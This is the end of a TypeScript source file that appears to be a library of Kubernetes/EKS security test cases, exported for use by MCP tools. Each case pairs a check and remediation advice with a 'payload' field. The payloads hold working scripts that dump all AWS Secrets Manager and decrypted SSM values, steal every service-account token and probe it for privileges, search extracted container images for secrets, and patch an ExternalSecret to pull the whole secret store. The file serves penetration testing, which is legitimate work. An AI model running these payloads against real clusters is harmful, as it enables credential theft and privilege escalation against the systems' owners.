  --key=/etc/kubernetes/pki/etcd/peer.key \\
  --cacert=/etc/kubernetes/pki/etcd/ca.crt

# Secrets appear in plaintext base64 encoded
    `,
  },

  'TC-SECRET-006': {
    id: 'TC-SECRET-006',
    name: 'AWS Secrets Manager/Parameter Store Hunting',
    description: 'Find and extract secrets from AWS secret stores',
    risk: 'HIGH',
    mitre: 'T1552.005 - Cloud Instance Metadata API',
    test: `
# From pod with AWS access (IRSA or node role)
# List Secrets Manager secrets
aws secretsmanager list-secrets --query 'SecretList[*].[Name,ARN]' --output table

# List SSM Parameters (including SecureString)
aws ssm describe-parameters --query 'Parameters[*].[Name,Type]' --output table

# Find parameters by path
aws ssm get-parameters-by-path --path "/" --recursive --query 'Parameters[*].Name'

# Check for secrets in common paths
for path in /prod /production /app /database /api /credentials; do
  aws ssm get-parameters-by-path --path "$path" --recursive 2>/dev/null
done
    `,
    remediation: `
# Use fine-grained IAM policies for secret access
# Enable CloudTrail logging for secrets access
# Use resource-based policies on secrets

# IAM policy example - least privilege
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": ["secretsmanager:GetSecretValue"],
    "Resource": "arn:aws:secretsmanager:*:*:secret:myapp/*",
    "Condition": {
      "StringEquals": {
        "aws:PrincipalTag/Application": "myapp"
      }
    }
  }]
}
    `,
    payload: `
# Get all Secrets Manager values
for secret in $(aws secretsmanager list-secrets --query 'SecretList[*].Name' --output text); do
  echo "=== $secret ==="
  aws secretsmanager get-secret-value --secret-id "$secret" --query 'SecretString' --output text
done

# Get all SSM SecureString parameters
for param in $(aws ssm describe-parameters --query 'Parameters[?Type==\`SecureString\`].Name' --output text); do
  echo "=== $param ==="
  aws ssm get-parameter --name "$param" --with-decryption --query 'Parameter.Value' --output text
done

# Dump all parameters
aws ssm get-parameters-by-path --path "/" --recursive --with-decryption
    `,
  },

  'TC-SECRET-007': {
    id: 'TC-SECRET-007',
    name: 'Container Image Embedded Secrets',
    description: 'Find secrets embedded in container images',
    risk: 'HIGH',
    mitre: 'T1552.001 - Credentials In Files',
    test: `
# List images used in cluster
kubectl get pods -A -o jsonpath='{range .items[*]}{range .spec.containers[*]}{.image}{"\\n"}{end}{end}' | sort -u

# For accessible images, scan for secrets
# Using trivy
trivy image --scanners secret <image-name>

# Using trufflehog
trufflehog docker --image <image-name>

# Manual inspection of image layers
docker history <image> --no-trunc
docker save <image> | tar -xvf - -C /tmp/image-extract
grep -r "password\\|secret\\|api.?key\\|token" /tmp/image-extract/
    `,
    remediation: `
# Use multi-stage builds to avoid secrets in final image
# Never COPY secrets into images
# Use runtime secret injection (volumes, env from secrets)
# Scan images in CI/CD pipeline

# In Dockerfile - BAD:
# COPY credentials.json /app/

# GOOD - inject at runtime:
# Mount from K8s secret or use init container
    `,
    payload: `
# Extract and analyze image from compromised node
crictl images
IMAGE_ID=$(crictl images | grep <image> | awk '{print $3}')

# Export and search
crictl image export $IMAGE_ID > image.tar
mkdir /tmp/extract && tar -xf image.tar -C /tmp/extract
find /tmp/extract -type f -exec grep -l "password\\|secret\\|api.?key" {} \\;

# Check Dockerfile ARG/ENV for secrets
find /tmp/extract -name "*.json" -exec cat {} \\; | jq '.config.Env[]?' 2>/dev/null | grep -iE "password|secret|key"
    `,
  },

  'TC-SECRET-008': {
    id: 'TC-SECRET-008',
    name: 'Git Repositories with Secrets',
    description: 'Find secrets in git repositories accessible from cluster',
    risk: 'HIGH',
    mitre: 'T1552.001 - Credentials In Files',
    test: `
# Find git directories in pods
kubectl exec -it <pod> -- find / -name ".git" -type d 2>/dev/null

# Check for hardcoded secrets in code
kubectl exec -it <pod> -- grep -r "password\\|secret\\|api.?key\\|token" /app --include="*.py" --include="*.js" --include="*.yaml" --include="*.json" --include="*.env"

# Look for .env files
kubectl exec -it <pod> -- find / -name ".env*" -o -name "*.env" 2>/dev/null

# Check git history for secrets
kubectl exec -it <pod> -- git -C /app log -p | grep -iE "password|secret|api.?key" | head -50
    `,
    remediation: `
# Use git-secrets or pre-commit hooks
# Scan repos with trufflehog/gitleaks in CI/CD
# Rotate any exposed credentials immediately
# Use .gitignore for secret files

# git-secrets setup
git secrets --install
git secrets --register-aws
    `,
    payload: `
# Clone accessible repos and scan
git clone <repo-url> /tmp/repo
cd /tmp/repo

# Scan full history with trufflehog
trufflehog git file:///tmp/repo --json

# Or with gitleaks
gitleaks detect -s /tmp/repo -v

# Manual git log search
git log -p --all | grep -iE "password|secret|api.?key|token" -B5 -A5
    `,
  },

  'TC-SECRET-009': {
    id: 'TC-SECRET-009',
    name: 'Service Account Tokens as Secrets',
    description: 'Find and abuse service account tokens stored as secrets',
    risk: 'CRITICAL',
    mitre: 'T1528 - Steal Application Access Token',
    test: `
# Find all SA token secrets
kubectl get secrets -A -o json | jq -r '.items[] | select(.type == "kubernetes.io/service-account-token") | "\\(.metadata.namespace)/\\(.metadata.name): \\(.metadata.annotations["kubernetes.io/service-account.name"])"'

# Check which SAs have token secrets
kubectl get sa -A -o json | jq -r '.items[] | select(.secrets != null) | "\\(.metadata.namespace)/\\(.metadata.name): \\(.secrets[].name)"'

# Decode and analyze token
TOKEN=$(kubectl get secret <sa-token-secret> -n <namespace> -o jsonpath='{.data.token}' | base64 -d)
echo $TOKEN | cut -d. -f2 | base64 -d | jq .
    `,
    remediation: `
# Use TokenRequest API instead of legacy secrets
# In K8s 1.24+, SA token secrets are not auto-created

# Delete unused token secrets
kubectl get secrets -A -o json | jq -r '.items[] | select(.type == "kubernetes.io/service-account-token") | "\\(.metadata.namespace) \\(.metadata.name)"' | while read ns name; do
  kubectl delete secret \$name -n \$ns
done

# Use short-lived tokens
kubectl create token <sa-name> --duration=1h
    `,
    payload: `
# Steal all SA tokens
kubectl get secrets -A -o json | jq -r '.items[] | select(.type == "kubernetes.io/service-account-token") | "\\(.metadata.namespace)/\\(.metadata.name):\\n\\(.data.token | @base64d)\\n"'

# Use stolen token
TOKEN="<stolen-token>"
kubectl --token=\$TOKEN auth can-i --list
kubectl --token=\$TOKEN get pods -A

# Find high-privilege tokens - iterate through all SA token secrets
kubectl get secrets -A -o json | jq -r '.items[] | select(.type == "kubernetes.io/service-account-token") | "\\(.metadata.namespace) \\(.metadata.name)"' | while read ns name; do
  TOKEN=\$(kubectl get secret \$name -n \$ns -o jsonpath='{.data.token}' | base64 -d)
  echo "=== \$ns/\$name ==="
  kubectl --token=\$TOKEN auth can-i create pods 2>/dev/null && echo "CAN CREATE PODS!"
done
    `,
  },

  'TC-SECRET-010': {
    id: 'TC-SECRET-010',
    name: 'External Secrets Operator Misconfigurations',
    description: 'Find misconfigurations in External Secrets Operator',
    risk: 'HIGH',
    mitre: 'T1552.001 - Credentials In Files',
    test: `
# Check if External Secrets Operator is installed
kubectl get crd | grep external-secrets

# List all ExternalSecrets
kubectl get externalsecrets -A

# Check SecretStores and ClusterSecretStores
kubectl get secretstores -A -o yaml
kubectl get clustersecretstores -o yaml

# Find ExternalSecrets with broad access
kubectl get externalsecrets -A -o json | jq -r '.items[] | select(.spec.dataFrom != null) | "\\(.metadata.namespace)/\\(.metadata.name): dataFrom configured"'

# Check sync status for failed syncs (may indicate permission issues)
kubectl get externalsecrets -A -o json | jq -r '.items[] | "\\(.metadata.namespace)/\\(.metadata.name): \\(.status.conditions[]? | select(.type=="Ready") | .status)"'
    `,
    remediation: `
# Use namespaced SecretStores instead of ClusterSecretStores
# Apply least privilege to secret store access
# Monitor ExternalSecret sync failures

# Example secure SecretStore:
apiVersion: external-secrets.io/v1beta1
kind: SecretStore
metadata:
  name: aws-secrets
  namespace: app-ns
spec:
  provider:
    aws:
      service: SecretsManager
      region: us-east-1
      auth:
        jwt:
          serviceAccountRef:
            name: app-sa  # Specific SA with limited permissions
    `,
    payload: `
# If SecretStore credentials accessible, pivot to cloud secret store
# Check SecretStore for embedded credentials (bad practice)
kubectl get secretstores -A -o yaml | grep -iE "accessKeyID|secretAccessKey|credentials"

# Modify ExternalSecret to sync additional secrets
kubectl patch externalsecret <name> -n <ns> --type=merge -p '{"spec":{"dataFrom":[{"extract":{"key":"/"}}]}}'
    `,
  },
};

// ============================================
// SUMMARY: ALL TEST CASES
// ============================================

export const allEKSTestCases = {
  ...eksSecurityTestCases,
  ...k8sWorkloadTestCases,
  ...k8sRBACTestCases,
  ...k8sNetworkTestCases,
  ...k8sServiceAccountTestCases,
  ...k8sSecretHuntingTestCases,
};

export function getTestCasesByRisk(risk: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW') {
  return Object.values(allEKSTestCases).filter(tc => tc.risk === risk);
}

export function getTestCasesWithPayloads() {
  return Object.values(allEKSTestCases).filter(tc => tc.payload !== null);
}

// Export for use in MCP tools
export default allEKSTestCases;
